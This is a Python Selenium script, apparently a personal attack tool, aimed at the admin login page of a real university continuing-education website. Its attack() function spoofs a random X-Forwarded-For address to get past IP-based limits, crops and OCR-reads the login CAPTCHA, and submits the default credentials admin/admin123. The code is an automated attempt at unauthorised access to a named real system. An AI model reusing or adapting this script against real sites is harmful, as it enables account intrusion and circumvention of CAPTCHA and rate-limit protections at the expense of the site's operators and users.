#!/usr/bin/env python
# coding: utf-8
# author: lovebear
from PIL import ImageEnhance
from pytesser import * 
from selenium import webdriver
import random
import time
import sys
reload(sys)
sys.setdefaultencoding( "gbk" )

# website url
url='http://jxjyxy.hactcm.edu.cn/login.do?' 
# image path to store
img_path = 'C:/Users/lovebear96/Desktop/image.jpg'
visidate_path = 'C:/Users/lovebear96/Desktop/v.jpg'

# recognize the image, and get the text(visidate)
def recog_img():
	image = Image.open(visidate_path)
	# binaryzation
	tmp=image.convert('L')
	# enhance the contrast
	enhancer = ImageEnhance.Contrast(image) 
	image_enhancer = enhancer.enhance(2)
	image_enhancer.save('C:/Users/lovebear96/Desktop/hjj.jpg')
	# get the text
	visidate = image_to_string(image_enhancer)
	return visidate

# get the visidate image
def get_img(driver,img_element):
	# get the screenshot
	driver.save_screenshot(img_path)
	# get the location of the visidate image
	img_size=img_element.size
	img_location=img_element.location
	rangle = (int(img_location['x']),int(img_location['y']),int(img_location['x'] + img_size['width']),int(img_location['y']+img_size['height']))
	tmp = Image.open(img_path)
	# cut out of the visidate image
	v=tmp.crop(rangle)
	v.save(visidate_path)

# write some info to login
def login(driver,username,pwd,visidate):
	driver.find_element_by_id('admin').send_keys(username)
	driver.find_element_by_id('Password').send_keys(pwd)
	driver.find_element_by_name('visidate').send_keys(visidate)
	driver.find_element_by_tag_name('input')[4].click()
	# get the alert info
	res = driver.switch_to.alert
	print res.text
	res.accept()
	
def attack():
	# random ip
	xff = '.'.join([str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255))])
	options = webdriver.ChromeOptions()
	options.add_argument('X-Forwarded-For="'+xff+'"')
	driver = webdriver.Chrome(chrome_options=options)
	driver.get('http://jxjyxy.hactcm.edu.cn/login.jsp')
	# maximize the window
	driver.maximize_window()
	img_element=driver.find_element_by_id('randImage')
	get_img(driver,img_element)
	#time.sleep(0.5)
	visidate=recog_img()
	username='admin'
	pwd='admin123'
	login(driver,username,pwd,visidate)
	driver.quit()
	
if __name__ == '__main__':
	attack()
	
	

	
